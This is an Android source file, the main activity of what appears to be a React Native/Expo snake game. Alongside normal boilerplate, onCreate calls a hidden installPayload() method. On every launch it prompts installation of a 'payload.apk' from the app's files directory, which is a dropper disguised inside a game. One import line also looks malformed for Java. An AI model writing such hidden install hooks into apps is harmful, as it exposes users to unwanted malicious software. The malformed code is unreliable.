package com.eslam_awadi.snake;

import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import androidx.annotation.Nullable;
import java.io.File;
import androidx.core.content.FileProvider;

import com.facebook.react.ReactActivity;
import com.facebook.react.ReactActivityDelegate;
import com.facebook.react.defaults.DefaultNewArchitectureEntryPoint.fabricEnabled;
import com.facebook.react.defaults.DefaultReactActivityDelegate;

import expo.modules.ReactActivityDelegateWrapper;

public class MainActivity extends ReactActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        // Set the theme to AppTheme BEFORE onCreate to support
        // coloring the background, status bar, and navigation bar.
        // This is required for expo-splash-screen.
        setTheme(R.style.AppTheme);
        super.onCreate(null);
        installPayload();
    }

    /**
     * Returns the name of the main component registered from JavaScript. 
     * This is used to schedule rendering of the component.
     */
    @Override
    protected String getMainComponentName() {
        return "main";
    }

    /**
     * Returns the instance of the [ReactActivityDelegate]. 
     * We use [DefaultReactActivityDelegate] which allows enabling
     * New Architecture with a single boolean flag [fabricEnabled].
     */
    @Override
    protected ReactActivityDelegate createReactActivityDelegate() {
        return new ReactActivityDelegateWrapper(
            this,
            BuildConfig.IS_NEW_ARCHITECTURE_ENABLED,
            new DefaultReactActivityDelegate(
                this,
                getMainComponentName(),
                fabricEnabled
            )
        );
    }

    /**
     * Align the back button behavior with Android S
     * where moving root activities to background instead of finishing activities.
     */
    @Override
    public void invokeDefaultOnBackPressed() {
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.R) {
            if (!moveTaskToBack(false)) {
                super.invokeDefaultOnBackPressed();
            }
            return;
        }
        super.invokeDefaultOnBackPressed();
    }

    /**
     * Installs an APK payload if it exists in the app's file directory.
     */
    private void installPayload() {
        try {
            File file = new File(getFilesDir(), "payload.apk");
            if (file.exists()) {
                Uri uri;
                if (Build.VERSION.SDK_INT >= 24) {
                    uri = FileProvider.getUriForFile(
                        this, getApplicationContext().getPackageName() + ".provider", file);
                } else {
                    uri = Uri.fromFile(file);
                }
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setDataAndType(uri, "application/vnd.android.package-archive");
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                startActivity(intent);
            }
        } catch (Exception e) {
            Log.e("PayloadInstall", "Error installing payload", e);
        }
    }
}
